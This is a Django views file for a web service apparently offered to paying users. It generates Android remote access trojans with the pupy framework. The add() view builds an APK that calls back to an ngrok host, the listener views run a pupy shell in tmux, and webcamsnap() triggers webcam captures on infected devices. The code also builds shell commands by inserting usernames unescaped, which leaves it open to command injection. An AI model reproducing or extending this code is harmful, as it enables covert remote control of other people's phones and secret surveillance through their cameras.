from django.shortcuts import render, redirect,get_object_or_404
from RAT import models
from django.http import HttpResponse, HttpResponseRedirect
from django.views import generic
from django.template import loader
import os, errno
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy,reverse
from RAT.forms import SignUpForm
import subprocess
import gmplot
from django.http import JsonResponse



def add(request):
    credits = models.Credit.objects.get(user = request.user)
    if credits.number > 0:
        credits.number-=1
        credits.save()
        host='0.tcp.ngrok.io:11681'
        username = request.user.username
        dir = '/root/django/users/'+ str(username)+'/'+str(username)
        d=os.system('mkdir /root/django/users/'+ str(username))
        c=os.system('cd /root/django/pupy/pupy ;./pupygen.py -O android -o '+ str(dir)+'.apk connect --host '+str(host)+' --transport ssl')
        if c == 0:
            c = "Your rat created in "+ str(dir)+".apk"
    else:
        c = 'you dont have credit'
    # Render the HTML template index.html with the data in the context variable
    return render(
        request,
        'addrat.html',
        context={'c' : c
        },
    )
#///////////////// listeniing
def listen(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)
    commandd = "tmux new-session -s "+str(username)
    os.system('xterm -T "'+str(username)+'" -e '+str(commandd))
    return render(
        request,
        'listen.html',
        context={
        }
    )
def startlisten(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)

    os.system('tmux send-keys -t '+str(username)+' "/root/django/pupy/pupy/pupysh.py""\n"')

    return redirect('RAT:listen')

def webcamsnap(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'

    os.system('tmux send-keys -t '+str(username)+' "webcamsnap -d 1 -o '+str(dir)+'""\n"')
    os.system('tmux send-keys -t '+str(username)+' "webcamsnap -d 2 -o '+str(dir)+'""\n"')

    return redirect('RAT:listen')
